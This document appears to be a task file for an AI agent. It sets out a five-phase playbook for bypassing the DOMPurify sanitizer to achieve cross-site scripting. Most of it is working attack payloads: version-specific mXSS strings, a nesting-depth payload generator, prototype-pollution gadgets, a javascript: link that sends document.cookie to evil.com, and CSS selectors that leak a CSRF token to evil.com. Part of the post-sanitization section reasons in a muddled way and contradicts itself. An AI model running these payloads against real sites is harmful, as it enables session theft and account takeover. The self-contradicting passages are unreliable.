# AGENT TASK: Complete DOMPurify Bypass Playbook - Step-by-Step Methodology
# PURPOSE: 5-phase systematic methodology for finding DOMPurify bypasses
# PRIORITY: PRIMARY ATTACK CHUNK - main playbook for your agent
# PHASES: 1-Recon, 2-Version Bypasses, 3-Config Exploit, 4-Post-Sanitization, 5-Framework
# INPUTS: Target URL, DOMPurify version (from Chunk 01), framework (from Chunk 05)
# OUTPUT: Complete bypass test results, working payloads, exploitation chains
# SECTIONS: F17 (Complete Bypass Methodology)
---

# PART VIII: Deep Attack Methodology and Exploitation Chains

**Purpose:** Complete penetration testing methodology with working payloads, step-by-step attack chains, exploitation techniques, and access-gaining methodology for authorized security testing.

---

# DOMPurify XSS Security Research — Deep Analysis Part 1

> **Classification:** Security Research Document
> **Sections:** F17, F18, F19
> **Scope:** DOMPurify bypass analysis, mXSS exploitation mechanics, DOM clobbering attack surface
> **Audience:** Authorized penetration testers, security researchers, application security engineers
> **Note:** All CVEs referenced are publicly disclosed and patched. Test only against systems you own or have written authorization to test.

---

## SECTION F17: Complete DOMPurify Bypass Methodology — Attacker's Playbook

This section provides an exhaustive methodology for authorized security assessments targeting applications that use DOMPurify for HTML sanitization. It is structured as a phased penetration testing playbook.

---

### Phase 1: Reconnaissance and Fingerprinting

The first step in any assessment is determining what sanitization is in place, how it is configured, and where sanitized output is consumed.

#### 1.1 DOMPurify Version Detection

Multiple techniques exist to fingerprint the DOMPurify version in use.

**Technique 1: Direct Property Access (Client-Side)**

If DOMPurify is exposed globally (common in non-bundled deployments):

```javascript
// Check browser console
console.log(DOMPurify.version);
// Returns string like "3.2.4"

// Check if it exists at all
console.log(typeof DOMPurify);
// "object" if globally available
```

**Technique 2: Bundle Analysis**

When DOMPurify is bundled (webpack, rollup, esbuild), the version string is often preserved in the bundle:

```
Step 1: Open browser DevTools -> Sources tab
Step 2: Search across all scripts for the string "DOMPurify"
Step 3: Look for version indicators:
   - String literal: '3.2.4' near DOMPurify constructor
   - Comment header: /*! DOMPurify 3.2.4 | ...
   - Property assignment: DOMPurify.version = '3.2.4'
Step 4: Check source maps if available (.map files)
   - Network tab -> filter by .map
   - May expose original node_modules/dompurify/dist/purify.js
```

**Technique 3: Package Lockfile Exposure**

```
Step 1: Probe for exposed lockfiles:
   GET /package-lock.json
   GET /yarn.lock
   GET /pnpm-lock.yaml
   GET /node_modules/dompurify/package.json

Step 2: Parse for version:
   "dompurify": {
     "version": "3.2.4",
     ...
   }

Step 3: Check CDN references in page source:
   <script src="https://cdnjs.cloudflare.com/ajax/libs/dompurify/3.2.4/purify.min.js">
   <!-- Version embedded in URL -->
```

**Technique 4: Behavioral Fingerprinting**

When version is not directly readable, infer it from behavior using payloads that changed behavior between versions:

```
Payload: <math><mtext><table><mglyph><style><!--</style>
  - Sanitized to empty string: version >= 2.0.17
  - Partial output preserved: version < 2.0.17

Payload: <noscript><p title="</noscript><img src=x>">
  - img tag removed: version >= 2.3.6
  - img tag preserved: version < 2.3.6

Payload: <form><math><mtext></form><form>
  - Second form removed: version >= 2.4.0
  - Both forms preserved: version < 2.4.0

Payload: Test with CUSTOM_ELEMENT_HANDLING features
  - Feature exists: version >= 2.5.0
  - Feature absent: version < 2.5.0
```

#### 1.2 Configuration Detection — Probing the Allowed Tag/Attribute Surface

Send systematic probes through the input field and observe what survives sanitization. Each probe tests a specific capability.

```
Probe Matrix:
==============================================================================
# | Probe Payload                                    | What It Tests
==============================================================================
1 | <b>test</b>                                      | Basic HTML formatting
2 | <img src="https://example.com/img.png">          | Image tags (media)
3 | <svg><rect width="10" height="10"/></svg>        | SVG support (foreign content)
4 | <math><mi>x</mi></math>                          | MathML support (foreign content)
5 | <div style="color:red">test</div>                | Inline style attributes
6 | <a href="javascript:void(0)">link</a>            | javascript: URI scheme
7 | <a href="data:text/html,test">link</a>           | data: URI scheme
8 | <div data-custom="test">test</div>               | data-* attributes
9 | <custom-element>test</custom-element>             | Custom elements
10| <div id="x" name="y">test</div>                  | id/name attributes (clobbering)
11| <table><tr><td>test</td></tr></table>             | Table elements
12| <iframe src="https://example.com"></iframe>       | iframe tags
13| <object data="x"></object>                        | object/embed tags
14| <form action="https://example.com"><input></form> | Form elements
15| <details><summary>click</summary>body</details>   | Interactive elements
16| <template><div>test</div></template>              | Template element
17| <div is="custom-div">test</div>                   | is="" attribute
18| <div tabindex="0" onfocus="x">test</div>          | Event handlers
19| <link rel="stylesheet" href="x">                  | link element
20| <meta http-equiv="refresh" content="0;url=x">     | meta element
==============================================================================
```

**Detection Script (run in browser console):**

```javascript
async function probeDOMPurify(inputSelector, outputSelector) {
    const probes = [
        { name: 'HTML basics', payload: '<b>PROBE_HTML</b>' },
        { name: 'Image tags', payload: '<img src="https://example.com/1x1.png" id="PROBE_IMG">' },
        { name: 'SVG support', payload: '<svg id="PROBE_SVG"><rect/></svg>' },
        { name: 'MathML support', payload: '<math id="PROBE_MATH"><mi>x</mi></math>' },
        { name: 'Style attr', payload: '<div id="PROBE_STYLE" style="color:red">x</div>' },
        { name: 'javascript: URI', payload: '<a id="PROBE_JSURI" href="javascript:void(0)">x</a>' },
        { name: 'data: URI', payload: '<a id="PROBE_DATAURI" href="data:text/html,x">x</a>' },
        { name: 'data-* attr', payload: '<div id="PROBE_DATA" data-x="y">x</div>' },
        { name: 'Custom elements', payload: '<probe-element id="PROBE_CUSTOM">x</probe-element>' },
        { name: 'id/name attr', payload: '<div id="PROBE_ID" name="PROBE_NAME">x</div>' },
        { name: 'Event handlers', payload: '<div id="PROBE_EVENT" onmouseover="x">x</div>' },
        { name: 'iframe', payload: '<iframe id="PROBE_IFRAME" src="about:blank"></iframe>' },
        { name: 'Form elements', payload: '<form id="PROBE_FORM"><input name="test"></form>' },
        { name: 'Template', payload: '<template id="PROBE_TPL"><div>x</div></template>' },
    ];

    const results = {};
    for (const probe of probes) {
        // Submit probe through application input
        const input = document.querySelector(inputSelector);
        input.value = probe.payload;
        input.dispatchEvent(new Event('input', { bubbles: true }));
        // Trigger form submission or rendering
        await new Promise(r => setTimeout(r, 500));

        const output = document.querySelector(outputSelector);
        const html = output.innerHTML;
        results[probe.name] = {
            survived: html.includes('PROBE_'),
            output: html
        };
    }
    console.table(results);
    return results;
}
```

#### 1.3 Sink Identification — Where Does Sanitized HTML End Up?

The sink determines the attack surface post-sanitization.

```
Attack Flow:
  User Input
      |
      v
  DOMPurify.sanitize(input, config)
      |
      v
  Sanitized Output (string or DOM)
      |
      v
  [SINK] — This determines available attack vectors
      |
      +---> innerHTML           — Standard DOM insertion, full mXSS surface
      +---> outerHTML           — Replaces element entirely, similar to innerHTML
      +---> document.write()   — Opens parser, different context rules
      +---> insertAdjacentHTML — Position-dependent, same parser as innerHTML
      +---> jQuery .html()     — Delegates to innerHTML but may eval scripts
      +---> jQuery .append()   — May create script elements separately
      +---> React dangerouslySetInnerHTML — React DOM reconciliation
      +---> Vue v-html         — Vue's DOM update cycle
      +---> Angular [innerHTML]— Angular's sanitizer may also apply
      +---> iframe srcdoc      — New document context, full parser
      +---> Shadow DOM         — Encapsulated DOM, style isolation
      +---> Web Worker blob    — If output used in Worker URL construction
```

**Sink Detection Methodology:**

```
Step 1: Inject unique marker string through sanitization
        Input: "MARKER_12345_MARKER"

Step 2: Search DOM for marker post-render
        document.querySelectorAll('*').forEach(el => {
            if (el.innerHTML.includes('MARKER_12345')) {
                console.log('Sink found:', el.tagName, el.id, el.className);
            }
        });

Step 3: Set breakpoints on DOM mutation
        const observer = new MutationObserver(mutations => {
            mutations.forEach(m => {
                if (m.type === 'childList') {
                    console.trace('DOM mutation at:', m.target);
                }
            });
        });
        observer.observe(document.body, { childList: true, subtree: true });

Step 4: Check for post-sanitization transforms
        // Hook DOMPurify output
        const origSanitize = DOMPurify.sanitize;
        DOMPurify.sanitize = function(...args) {
            const result = origSanitize.apply(this, args);
            console.log('Sanitized output:', result);
            // Set breakpoint here, then trace where result is used
            return result;
        };
```

---

### Phase 2: Version-Specific Bypass Testing

This section maps known bypass payloads to specific DOMPurify version ranges. All CVEs listed are patched.

#### Bypass Matrix

```
===================================================================================
Version Range     | CVE              | CVSS | Technique           | Browser Req
===================================================================================
< 0.8.9           | (none assigned)  | --   | SVG script          | All
< 2.0.17          | (none assigned)  | --   | Namespace mXSS      | All
< 2.2.3           | (none assigned)  | --   | ALLOWED_URI_REGEXP   | All
< 2.3.6           | (none assigned)  | --   | noscript mXSS       | Chrome/Edge
< 2.4.0           | (none assigned)  | --   | Form nesting mXSS   | All
< 3.0.6           | CVE-2024-45801   | 7.0  | Prototype pollution  | All
< 3.1.3           | CVE-2024-47875   | 10.0 | Nesting depth mXSS  | Chrome/Edge
< 3.2.4           | CVE-2025-26791   | 7.1  | Custom elem + templ  | All (non-dflt)
===================================================================================
```

#### Payload 1: Namespace Confusion mXSS (DOMPurify < 2.0.17)

```html
<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>
```

**Mechanism:**

```
Parse Phase (DOMPurify):
  <math>                          ← Enter MathML namespace
    <mtext>                       ← MathML text integration point
      <table>                     ← Parsed in HTML namespace (integration point)
        <mglyph>                  ← Back to MathML namespace
          <style>                 ← MathML <style> = rawtext (inert)
            <img src=x onerror=..>  ← Treated as rawtext (safe)

Serialize (innerHTML read):
  "<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>"

Reparse Phase (browser innerHTML set):
  <math>
    <mtext>
      <table>                     ← foster-parented out of table
        <mglyph>                  ← Triggers HTML namespace
          <style>                 ← HTML <style> = rawtext
            <img src=x onerror=..>  ← Now HTML context = EXECUTES
```

The key insight: `<style>` in MathML namespace is a regular element whose children are child nodes. But when re-serialized and re-parsed in HTML context, `<style>` becomes a rawtext element, and the `<img>` inside it is expelled by the parser into the HTML body where `onerror` fires.

#### Payload 2: noscript Parsing Discrepancy (DOMPurify < 2.3.6)

```html
<noscript><p title="</noscript><img src onerror=alert(1)>">
```

**Mechanism:**

```
DOMPurify Parse (scripting flag ON, as in browser JS context):
  <noscript>
    <p title="</noscript><img src onerror=alert(1)>">
      ← Entire img tag is INSIDE the title attribute value
      ← Because with scripting=ON, noscript content is rawtext
      ← The </noscript> inside the title is consumed as rawtext

Serialize:
  <noscript><p title="</noscript><img src onerror=alert(1)>"></noscript>

Browser Reparse (scripting flag dependent on context):
  IF scripting=OFF (noscript content rendered):
    <noscript>
      <p title="">              ← title attribute ends at first "
    </noscript>                 ← noscript closes
    <img src onerror=alert(1)>  ← Now in body context = EXECUTES
```

This exploits the fact that `<noscript>` has different parsing rules depending on the scripting flag. DOMPurify parses with scripting enabled (JavaScript context), but certain insertion contexts may reparse with different assumptions.

#### Payload 3: Form Nesting mXSS (DOMPurify < 2.4.0)

```html
<form><math><mtext></form><form><mglyph><svg><mtext><style><img src onerror=alert(1)>
```

**Mechanism:**

```
DOMPurify Parse:
  <form>
    <math>
      <mtext>                      ← text integration point
      </form>                      ← closes the form (adoption agency)
      <form>                       ← NEW form, but form-in-form ignored by spec
        <mglyph>                   ← triggers HTML namespace
          <svg>                    ← enter SVG namespace
            <mtext>                ← SVG mtext (no integration point in SVG)
              <style>              ← SVG/MathML <style> = regular element
                <img src onerror>  ← child of style, inert

Serialize & Reparse:
  When serialized, namespace context is lost.
  On reparse, <style> in HTML context = rawtext container.
  Parser ejects <img> tag into the body.
  onerror fires.
```

#### Payload 4: Prototype Pollution Bypass (CVE-2024-45801, DOMPurify < 3.0.6)

This bypass requires a prototype pollution primitive elsewhere in the application.

```javascript
// Step 1: Achieve prototype pollution (via other vulnerability)
// Common pollution gadgets:
Object.prototype.__proto__ = null; // Breaks hasOwnProperty checks
// OR
Object.prototype.ALLOWED_TAGS = ['script', 'img'];
Object.prototype.ALLOWED_ATTR = ['onerror', 'onload', 'src'];
// OR via merge/extend functions
// merge({}, JSON.parse('{"__proto__":{"ALLOWED_TAGS":["script"]}}'));

// Step 2: DOMPurify now uses polluted config
const dirty = '<img src=x onerror=alert(document.cookie)>';
const clean = DOMPurify.sanitize(dirty);
// With polluted ALLOWED_TAGS/ALLOWED_ATTR, the payload survives

// Step 3: Application inserts "sanitized" HTML
document.getElementById('output').innerHTML = clean;
// Script executes
```

**Exploitation flow:**

```
Prototype Pollution Gadget     DOMPurify.sanitize()       Sink (innerHTML)
(e.g., lodash merge,    --->   reads config from    --->  Inserts payload
 jQuery extend, qs)            polluted prototype          into DOM
         |                            |                         |
         v                            v                         v
  Pollute Object.prototype     Config overridden          XSS achieved
  with ALLOWED_TAGS/ATTR       to permit <script>,
                               event handlers, etc.
```

#### Payload 5: Nesting Depth mXSS (CVE-2024-47875, CVSS 10.0, DOMPurify < 3.1.3)

This exploits a browser-specific parser behavior where Chromium-based browsers cap DOM nesting at 512 levels.

```javascript
// Generate the payload
function generateDepthPayload() {
    // Create 512+ levels of nesting to hit browser depth cap
    let prefix = '';
    let suffix = '';
    for (let i = 0; i < 514; i++) {
        prefix += '<div>';
        suffix += '</div>';
    }
    // At depth >= 512, parser stops nesting and siblings are created
    // This changes how subsequent tags are interpreted
    const payload = prefix +
        '<style>' +
        '<img src onerror=alert(document.domain)>' +
        '</style>' +
        suffix;
    return payload;
}

const payload = generateDepthPayload();
const sanitized = DOMPurify.sanitize(payload);
// DOMPurify parses: <style> at depth 514 is child of div at 514
//   Content is rawtext (inert)
// Browser reparses: at depth 512, parser pops back
//   <style> ends up at different depth, <img> is ejected
```

**Detailed mechanism:**

```
DOMPurify's DOMParser:
  <div> (depth 1)
    <div> (depth 2)
      ...
        <div> (depth 514)
          <style>                    ← rawtext element, content is text
            "<img src onerror=...>"  ← just text, safe
          </style>

Serialized innerHTML:
  "<div><div>...<div><style><img src onerror=alert(1)></style></div>...</div></div>"

Browser innerHTML reparse (Chromium):
  <div> (depth 1)
    <div> (depth 2)
      ...
        <div> (depth 512)           ← MAX DEPTH, parser stops nesting
        <div>                       ← foster-parented or sibling
        <style>                     ← DIFFERENT DEPTH CONTEXT
          (rawtext ends differently)
        <img src onerror=alert(1)>  ← EXPOSED IN HTML BODY
```

**Browser-specific depth caps:**

```
Browser          | Max Nesting Depth | Exploitable
=================================================
Chrome/Chromium  | 512               | Yes
Edge (Chromium)  | 512               | Yes
Firefox          | ~2000+            | Different behavior
Safari/WebKit    | ~512 (varies)     | Version-dependent
```

#### Payload 6: Custom Element + SAFE_FOR_TEMPLATES (CVE-2025-26791, DOMPurify < 3.2.4)

This requires non-default configuration with both `SAFE_FOR_TEMPLATES` and `CUSTOM_ELEMENT_HANDLING`:

```javascript
const dirty = `<math>` +
  `<foo-bar>` +
    `<mi><li><table>` +
      `<foo-bar>` +
        `<li></li>` +
      `</foo-bar>` +
      `<a><style><! \${</style>}` +
      `<foo-baz id="><img src onerror='alert(1)'>">hmm</foo-baz>` +
    `</a></table></li></mi>` +
  `</foo-bar>` +
`</math>`;

const config = {
    SAFE_FOR_TEMPLATES: true,
    CUSTOM_ELEMENT_HANDLING: {
        tagNameCheck: /^foo-/,
        attributeNameCheck: () => true,
        allowCustomizedBuiltInElements: false
    }
};

const clean = DOMPurify.sanitize(dirty, config);
document.getElementById('output').innerHTML = clean;
```

**Mechanism:**

```
The interaction chain:
  1. CUSTOM_ELEMENT_HANDLING allows foo-bar, foo-baz tags
  2. MathML namespace creates integration points
  3. Table parsing triggers foster-parenting
  4. SAFE_FOR_TEMPLATES processes ${ } markers
  5. The template marker processing interacts with the <style>
     element boundary, causing content to be reinterpreted
  6. The id attribute on foo-baz contains the actual payload
     enclosed in quotes that break out after template processing
  7. On reparse, the img tag with onerror is exposed
```

#### Additional Version-Specific Payloads

**DOMPurify < 0.8.9 — Direct SVG script:**
```html
<svg><script>alert(1)</script></svg>
```
Early versions did not strip `<script>` inside SVG namespace.

**DOMPurify < 1.0.0 — data: URI in SVG use:**
```html
<svg><use href="data:image/svg+xml,<svg onload=alert(1)>"/></svg>
```

**DOMPurify < 2.0.0 — SVG animate with href:**
```html
<svg><animate href="#x" attributeName="href" values="javascript:alert(1)"/></svg>
```

**DOMPurify < 2.0.6 — MathML + style injection:**
```html
<math><mtext><style><img src=x onerror=alert(1)></style></mtext></math>
```

**DOMPurify < 2.1.0 — Nested foreignObject:**
```html
<svg><foreignObject><body><img src=x onerror=alert(1)></body></foreignObject></svg>
```

**DOMPurify < 2.2.0 — select + style mXSS:**
```html
<svg><select><style></select><img src=x onerror=alert(1)></style></select></svg>
```

**DOMPurify < 2.2.3 — Custom URI regexp bypass:**
```javascript
// If app uses ALLOWED_URI_REGEXP:
DOMPurify.sanitize('<a href="javascript:alert(1)">x</a>', {
    ALLOWED_URI_REGEXP: /^(https?|ftp|javascript):/   // Misconfigured regex!
});
```

**DOMPurify 2.x with RETURN_DOM — DOM mutation race:**
```javascript
const dom = DOMPurify.sanitize(input, { RETURN_DOM: true });
// Between sanitize return and DOM insertion, mutations can occur
// if application code traverses/modifies the returned DOM
```

**DOMPurify with ADD_TAGS misconfiguration:**
```javascript
// Dangerous: application allows script-like tags
DOMPurify.sanitize(payload, {
    ADD_TAGS: ['script'],       // Direct XSS
    ADD_TAGS: ['iframe'],       // Frame injection
    ADD_TAGS: ['object'],       // Plugin-based execution
    ADD_TAGS: ['embed'],        // Plugin-based execution
    ADD_TAGS: ['base'],         // Base URL hijacking
    ADD_TAGS: ['link'],         // Stylesheet injection
});
```

**DOMPurify with ADD_ATTR misconfiguration:**
```javascript
DOMPurify.sanitize(payload, {
    ADD_ATTR: ['onclick'],      // Direct event handler
    ADD_ATTR: ['onfocus'],      // Event handler
    ADD_ATTR: ['onload'],       // Event handler
    ADD_ATTR: ['onerror'],      // Event handler
    ADD_ATTR: ['href'],         // Already allowed, but combined with
    ADD_ATTR: ['xlink:href'],   //   ALLOW_UNKNOWN_PROTOCOLS = URI bypass
    ADD_ATTR: ['style'],        // CSS injection surface
    ADD_ATTR: ['srcdoc'],       // iframe content injection
    ADD_ATTR: ['action'],       // Form action hijacking
    ADD_ATTR: ['formaction'],   // Submit action override
});
```

---

### Phase 3: Configuration Exploitation

DOMPurify's security depends heavily on correct configuration. Many bypasses exploit non-default settings.

#### 3.1 ALLOW_UNKNOWN_PROTOCOLS: true

```javascript
// Default behavior blocks javascript: URIs
DOMPurify.sanitize('<a href="javascript:alert(1)">x</a>');
// Output: <a>x</a>  (href removed)

// With ALLOW_UNKNOWN_PROTOCOLS:
DOMPurify.sanitize('<a href="javascript:alert(1)">x</a>', {
    ALLOW_UNKNOWN_PROTOCOLS: true
});
// Output: <a href="javascript:alert(1)">x</a>  (href preserved!)
```

Applications enable this when they need custom URI schemes (e.g., `app://`, `custom://`). The bypass is direct — `javascript:` URIs are no longer blocked.

**Exploitation payload set:**
```html
<!-- Direct execution -->
<a href="javascript:alert(document.domain)">Click me</a>
<a href="javascript:fetch('https://evil.com/?c='+document.cookie)">Click</a>

<!-- iframe with javascript src -->
<iframe src="javascript:alert(1)"></iframe>

<!-- form action -->
<form action="javascript:alert(1)"><button>Submit</button></form>

<!-- Object data -->
<object data="javascript:alert(1)"></object>

<!-- Base href hijacking -->
<base href="javascript:/a/-alert(1)//">
<!-- All relative URLs now use javascript: scheme -->

<!-- SVG animate -->
<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click</text></a></svg>
```

#### 3.2 WHOLE_DOCUMENT Mode

```javascript
DOMPurify.sanitize(dirty, { WHOLE_DOCUMENT: true });
```

In WHOLE_DOCUMENT mode, DOMPurify wraps the input in `<html><head><body>` and preserves that structure. This enables elements that are only valid in `<head>`:

```html
<!-- Meta refresh redirect -->
<meta http-equiv="refresh" content="0;url=https://evil.com">

<!-- Base tag hijacking -->
<base href="https://evil.com/">
<!-- All relative URLs in the page now resolve to evil.com -->

<!-- Link stylesheet injection (if <link> is ADD_TAGS'd) -->
<link rel="stylesheet" href="https://evil.com/steal.css">
<!-- CSS can exfiltrate data via attribute selectors -->
```

#### 3.3 FORCE_BODY Bypasses

```javascript
DOMPurify.sanitize(dirty, { FORCE_BODY: true });
```

When FORCE_BODY is true, DOMPurify forces content to be parsed as `<body>` content. This affects how elements outside `<body>` are handled during serialization, potentially causing elements to shift position in ways that create mXSS.

#### 3.4 SAFE_FOR_TEMPLATES with Custom Elements

As demonstrated in CVE-2025-26791, combining SAFE_FOR_TEMPLATES with CUSTOM_ELEMENT_HANDLING creates a dangerous interaction:

```javascript
const config = {
    SAFE_FOR_TEMPLATES: true,
    CUSTOM_ELEMENT_HANDLING: {
        tagNameCheck: /^x-/,
        attributeNameCheck: () => true
    }
};
```

SAFE_FOR_TEMPLATES causes DOMPurify to process `{{ }}` and `${ }` template markers, replacing them with empty strings. When combined with custom elements that can have arbitrary attributes, the template processing can break attribute boundaries.

#### 3.5 setConfig() State Pollution

```javascript
// DOMPurify maintains internal state
DOMPurify.setConfig({ ALLOWED_TAGS: ['b', 'i', 'em'] });

// Subsequent calls use the stored config
DOMPurify.sanitize('<b>test</b>');  // Uses stored config

// Attack: if attacker can call setConfig before sanitize
DOMPurify.setConfig({
    ALLOWED_TAGS: ['script', 'img', 'svg'],
    ALLOWED_ATTR: ['onerror', 'onload', 'src']
});
// Next sanitize call permits XSS payloads
```

**Race condition via prototype pollution:**
```javascript
// If Object.prototype is polluted before DOMPurify reads config:
Object.prototype.ADD_TAGS = ['script'];
Object.prototype.ADD_ATTR = ['onerror', 'onload'];

// DOMPurify's _parseConfig merges defaults with user config
// Polluted prototype properties are read as config values
// Result: script tags and event handlers are permitted
```

#### 3.6 Custom ALLOWED_URI_REGEXP and ReDoS

```javascript
// Application defines custom URI regexp
DOMPurify.sanitize(input, {
    ALLOWED_URI_REGEXP: /^(?:https?|ftp|mailto|tel|callto|sip|cid|xmpp):$/i
});
```

If the custom regexp is poorly constructed, it may:
1. Permit `javascript:` URIs through regex backtracking
2. Be vulnerable to ReDoS (Regular Expression Denial of Service)

```javascript
// ReDoS payload (if regexp uses nested quantifiers):
// href="aaaaaaaaaaaaaaaaaaaaaaaaaaa!" with a vulnerable pattern
// can cause exponential backtracking, freezing the browser
```

---

### Phase 4: Post-Sanitization Attack Chains

Even when DOMPurify correctly sanitizes the input, the application may introduce vulnerabilities in how it uses the sanitized output.

#### 4.1 String Concatenation After Sanitization

```javascript
// VULNERABLE: Concatenating sanitized output with unsanitized content
const userTitle = DOMPurify.sanitize(titleInput);
const userBody = DOMPurify.sanitize(bodyInput);

// Developer thinks this is safe because both inputs are sanitized
container.innerHTML = '<h1 class="' + userTitle + '">' + userBody + '</h1>';
//                              ^^^^^^^^^^^^^^^^^^^^
//                              INJECTION POINT!
// userTitle is sanitized HTML, but here it's in an attribute context
```

**Exploit:**
```
titleInput: "><img src=x onerror=alert(1)><div class="
DOMPurify sanitizes this to: &quot;&gt;&lt;img src=x onerror=alert(1)...
WAIT - DOMPurify sanitizes the STRING, but characters like " > < are
only dangerous IN CONTEXT.

Correct attack: exploit the string concatenation itself:
titleInput: x" onclick="alert(1)
After sanitize: x" onclick="alert(1)  (these are text, not HTML)
In context: <h1 class="x" onclick="alert(1)">  ← ATTRIBUTE INJECTION
```

Actually, DOMPurify sanitizes HTML, not attribute values. The correct attack vector:

```javascript
// More realistic vulnerable pattern:
const sanitized = DOMPurify.sanitize(userInput);
const wrapper = '<div data-content="' + sanitized + '">';
document.body.innerHTML += wrapper;

// Attack: userInput = '"><img src=x onerror=alert(1)><div x="'
// sanitized = '"><img src=x onerror=alert(1)><div x="'
// (DOMPurify treats this as safe HTML — no event handlers in HTML context)
// But in attribute context: breaks out of data-content attribute
```

The real vulnerability pattern:

```javascript
// VULNERABLE pattern 1: innerHTML concatenation
const sanitized = DOMPurify.sanitize(input);
el.innerHTML = '<div>' + sanitized + '</div>';  // Mostly safe, but watch context

// VULNERABLE pattern 2: attribute context mismatch
const sanitized = DOMPurify.sanitize(input);
el.innerHTML = '<input value="' + sanitized + '">';
// Sanitized HTML in attribute context can break out

// VULNERABLE pattern 3: mixing sanitized and unsanitized
const sanitized = DOMPurify.sanitize(input1);
const raw = input2;  // NOT sanitized!
el.innerHTML = sanitized + raw;  // raw is the XSS vector

// VULNERABLE pattern 4: URL context
const sanitized = DOMPurify.sanitize(input);
el.innerHTML = '<a href="' + sanitized + '">link</a>';
// Sanitized text "javascript:alert(1)" is harmless as innerHTML
// But as href value, it becomes a javascript: URI
```

#### 4.2 Template Literal Injection

```javascript
// VULNERABLE:
const sanitized = DOMPurify.sanitize(userInput);
el.innerHTML = `<div class="user-content">${sanitized}</div>`;

// Usually safe because DOMPurify output IS HTML.
// But if application later does:
const html = `<script>var data = "${sanitized}";</script>`;
document.write(html);
// Now sanitized HTML is inside a script context
// Payload: </script><img src=x onerror=alert(1)>
// DOMPurify sees no script context, passes it through
```

#### 4.3 Attribute Context Injection

```javascript
// VULNERABLE:
const sanitized = DOMPurify.sanitize(userInput);  // HTML context sanitization
element.setAttribute('onclick', sanitized);
// DOMPurify sanitized for HTML context, not JS context
// Payload survives: alert(document.cookie)

// VULNERABLE:
const sanitized = DOMPurify.sanitize(userInput);
element.setAttribute('href', sanitized);
// DOMPurify strips javascript: from <a href>, but the raw text
// "javascript:alert(1)" is valid text that DOMPurify preserves
// When set as href attribute value directly, it becomes executable
```

#### 4.4 URL Context Injection

```javascript
// VULNERABLE:
const sanitized = DOMPurify.sanitize(userInput);
window.location.href = sanitized;  // Navigates to attacker URL
window.open(sanitized);            // Opens attacker URL

// DOMPurify sanitizes HTML. Plain text URLs pass through:
// Input: "https://evil.com/phish"
// Sanitized: "https://evil.com/phish"  (it's just text)
// Used as URL: navigates to attacker site
```

#### 4.5 CSS Context Injection

```javascript
// VULNERABLE:
const sanitized = DOMPurify.sanitize(userInput);
element.style.cssText = sanitized;

// DOMPurify removes style elements and style attributes
// But sanitized TEXT content can contain CSS:
// Input: "background:url('https://evil.com/track?cookie='+document.cookie)"
// Older browsers: expression() in CSS for JS execution
// Modern browsers: CSS-based data exfiltration via attribute selectors
```

**CSS data exfiltration payload:**
```css
/* Exfiltrate CSRF token character by character */
input[name="csrf"][value^="a"] { background: url("https://evil.com/leak?csrf=a") }
input[name="csrf"][value^="b"] { background: url("https://evil.com/leak?csrf=b") }
/* ... for every character ... */
input[name="csrf"][value^="aa"] { background: url("https://evil.com/leak?csrf=aa") }
/* Recursive exfiltration */
```

#### 4.6 Race Conditions: Async Sanitize, Sync Insert

```javascript
// VULNERABLE: Time-of-check-time-of-use (TOCTOU)
async function processInput(input) {
    const sanitized = DOMPurify.sanitize(input);  // Step 1: sanitize

    // ... async operations happen here ...
    await saveToDatabase(sanitized);
    const fromDB = await loadFromDatabase();       // Step 2: load back

    // If the database modified the content (stored XSS vector):
    document.getElementById('output').innerHTML = fromDB;
    // fromDB may differ from sanitized if DB transforms content
    // e.g., character encoding changes, HTML entity decoding
}
```

---

### Phase 5: Framework-Specific Exploitation

#### 5.1 React Exploitation

**dangerouslySetInnerHTML:**
```jsx
function UserContent({ html }) {
    const sanitized = DOMPurify.sanitize(html);
    return <div dangerouslySetInnerHTML={{ __html: sanitized }} />;
}
// Attack surface: mXSS payloads, post-sanitization React reconciliation
// React uses innerHTML internally for dangerouslySetInnerHTML
// Full mXSS payload set applies
```

**ref-based DOM manipulation:**
```jsx
function VulnerableComponent({ userInput }) {
    const ref = useRef(null);

    useEffect(() => {
        // VULNERABLE: direct DOM manipulation bypasses React's model
        ref.current.innerHTML = userInput;  // No sanitization!
    }, [userInput]);

    return <div ref={ref} />;
}
```

**Server-side rendering (SSR) context:**
```jsx
// During SSR, DOMPurify uses jsdom or similar
// Browser-side rehydration re-parses the HTML
// Parser differences between server (jsdom) and client (browser)
// can create mXSS opportunities similar to the depth-cap attack
```

#### 5.2 Vue Exploitation

**v-html directive:**
```html
<template>
  <div v-html="sanitizedContent"></div>
</template>
<script>
export default {
  computed: {
    sanitizedContent() {
      return DOMPurify.sanitize(this.userInput);
    }
  }
}
</script>
<!-- Attack: mXSS payloads, Vue uses innerHTML for v-html -->
```

**Vue compile() injection:**
```javascript
// VULNERABLE: dynamic template compilation
import { compile } from 'vue';
const template = DOMPurify.sanitize(userInput);
const component = compile(template);
// Even sanitized HTML can contain Vue template syntax:
// {{ constructor.constructor('alert(1)')() }}
// DOMPurify doesn't know about Vue template expressions
```

#### 5.3 Angular Exploitation

**bypassSecurityTrustHtml:**
```typescript
// VULNERABLE: bypassing Angular's built-in sanitizer
@Component({
  template: '<div [innerHTML]="trustedHtml"></div>'
})
export class VulnComponent {
  trustedHtml: SafeHtml;

  constructor(private sanitizer: DomSanitizer) {
    // Developer uses DOMPurify instead of Angular's sanitizer
    const clean = DOMPurify.sanitize(userInput);
    // Then bypasses Angular's sanitizer with the "already clean" output
    this.trustedHtml = this.sanitizer.bypassSecurityTrustHtml(clean);
    // If DOMPurify has a bypass, Angular's second layer is gone
  }
}
```

**[innerHTML] binding without bypass:**
```typescript
// Angular applies its own sanitization on [innerHTML]
// But if the app uses DOMPurify AND Angular sanitizes again,
// the double-sanitization can create differential parsing issues
```

#### 5.4 jQuery Exploitation

```javascript
// jQuery .html() delegates to innerHTML but has special script handling
const sanitized = DOMPurify.sanitize(userInput);
$('#output').html(sanitized);
// jQuery evaluates <script> tags inserted via .html()
// DOMPurify removes <script>, but if mXSS creates one on reparse...

// jQuery .append() script evaluation
$('#output').append(sanitized);
// .append() also evaluates scripts

// jQuery AJAX + HTML insertion
$.get('/api/content', function(data) {
    const clean = DOMPurify.sanitize(data);
    $('#container').html(clean);
});
```

#### 5.5 Svelte Exploitation

```html
<!-- Svelte {@html} directive -->
<script>
  import DOMPurify from 'dompurify';
  export let userInput;
  $: sanitized = DOMPurify.sanitize(userInput);
</script>

{@html sanitized}
<!-- Svelte uses innerHTML for {@html} -->
<!-- Full mXSS attack surface applies -->
```

